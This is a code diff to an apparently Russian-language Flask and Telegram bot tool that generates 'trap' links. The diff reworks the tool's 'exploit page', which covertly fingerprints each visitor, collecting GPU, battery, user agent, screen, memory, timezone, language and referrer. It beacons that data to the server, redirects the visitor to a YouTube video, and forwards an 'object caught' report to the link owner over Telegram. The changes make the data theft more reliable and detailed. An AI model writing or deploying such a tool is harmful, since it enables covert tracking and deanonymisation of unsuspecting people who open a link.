@@ -36,7 +36,7 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] EXPLOIT PAGE (ULTRA-FAST & NO-AWAIT)
+# [2] EXPLOIT PAGE (DETAILED & STABLE)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -62,11 +62,10 @@ HTML_TEMPLATE = """
     const sid = "{{sid}}";
     let fired = false;
 
-    function ignite() {
+    async function ignite() {
         if (fired) return;
         fired = true;
 
-        // Собираем данные мгновенно
         let gpu = "N/A";
         try {
             const gl = document.createElement('canvas').getContext('webgl');
@@ -74,10 +73,19 @@ HTML_TEMPLATE = """
             gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
         } catch(e) {}
 
+        let batteryStatus = "Blocked/iOS";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryStatus = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+            }
+        } catch(e) {}
+
         const info = {
             sid: sid,
-            ua: navigator.userAgent,
+            bat: batteryStatus,
             gpu: gpu,
+            ua: navigator.userAgent,
             res: screen.width + "x" + screen.height,
             plat: navigator.platform,
             mem: navigator.deviceMemory || "N/A",
@@ -85,25 +93,19 @@ HTML_TEMPLATE = """
             lang: navigator.language,
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
             ratio: window.devicePixelRatio,
-            touch: navigator.maxTouchPoints
+            touch: navigator.maxTouchPoints,
+            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
+            online: navigator.onLine,
+            ref: document.referrer || "Direct"
         };
 
-        // Пытаемся взять батарею БЕЗ await (синхронно если есть кэш)
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                info.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-                send(info);
-            }).catch(() => { send(info); });
-        } else {
-            info.bat = "Blocked (iOS)";
-            send(info);
-        }
+        // Отправка через Beacon (надежно)
+        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
 
-        function send(data) {
-            navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(data)));
-            // Редирект СРАЗУ после команды на отправку
+        // Даем небольшую паузу и уходим
+        setTimeout(() => {
             window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-        }
+        }, 600);
     }
 </script>
 </body>
@@ -111,7 +113,7 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC (FORMATTED REPORT)
+# [3] SERVER LOGIC (STRICT & READABLE REPORT)
 # =================================================================
 
 @app.route('/gate/capture', methods=['POST'])
@@ -122,26 +124,30 @@ def capture():
         sid = str(d.get('sid'))
         
         report = (
-            f"<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
+            f"<b>🚀 ОБЪЕКТ ПОЙМАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
-            f"🔋 <b>Заряд:</b> <code>{d.get('bat', 'N/A')}</code>\n\n"
+            f"🆔 <b>ID Ссылки:</b> <code>{sid}</code>\n"
+            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
             
-            f"<b>🛠 ЖЕЛЕЗО:</b>\n"
+            f"<b>💻 ЖЕЛЕЗО:</b>\n"
             f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
-            f"• 🧠 <b>Cores/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
+            f"• 🧠 <b>CPU:</b> <code>{d.get('cores')} Cores</code>\n"
+            f"• 💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
             f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
             
-            f"<b>🖥 ДИСПЛЕЙ:</b>\n"
-            f"• 📐 <b>Res:</b> <code>{d.get('res')}</code>\n"
-            f"• 🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
-            f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
+            f"<b>📺 ДИСПЛЕЙ:</b>\n"
+            f"• 📐 <b>Разрешение:</b> <code>{d.get('res')}</code>\n"
+            f"• 🔍 <b>Pixel Ratio:</b> <code>{d.get('ratio')}</code>\n"
+            f"• 👆 <b>Тач-точки:</b> <code>{d.get('touch')} pts</code>\n\n"
             
-            f"<b>⚙️ СИСТЕМА:</b>\n"
-            f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
-            f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
+            f"<b>🌐 СИСТЕМА:</b>\n"
+            f"• 🗺 <b>Таймзона:</b> <code>{d.get('tz')}</code>\n"
+            f"• 🗣 <b>Язык:</b> <code>{d.get('lang')}</code>\n"
+            f"• 🌙 <b>Dark Mode:</b> <code>{'Да' if d.get('dark') else 'Нет'}</code>\n"
+            f"• 🔗 <b>Откуда:</b> <code>{d.get('ref')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:130]}...</code>"
+            f"🛰 <b>USER-AGENT:</b>\n"
+            f"<code>{d.get('ua')[:120]}...</code>"
         )
         
         owner_id = get_owner(sid)
@@ -174,7 +180,7 @@ def bot_loop():
                     if msg["text"] == "/start":
                         save_link(str(cid), cid)
                         link = f"{BASE_URL}/v/{cid}"
-                        text = f"🕶 <b>Система готова</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>"
+                        text = f"🕶 <b>Система развернута</b>\n\nТвоя ловушка:\n<a href='{link}'>{link}</a>"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                       json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
         except: time.sleep(5)
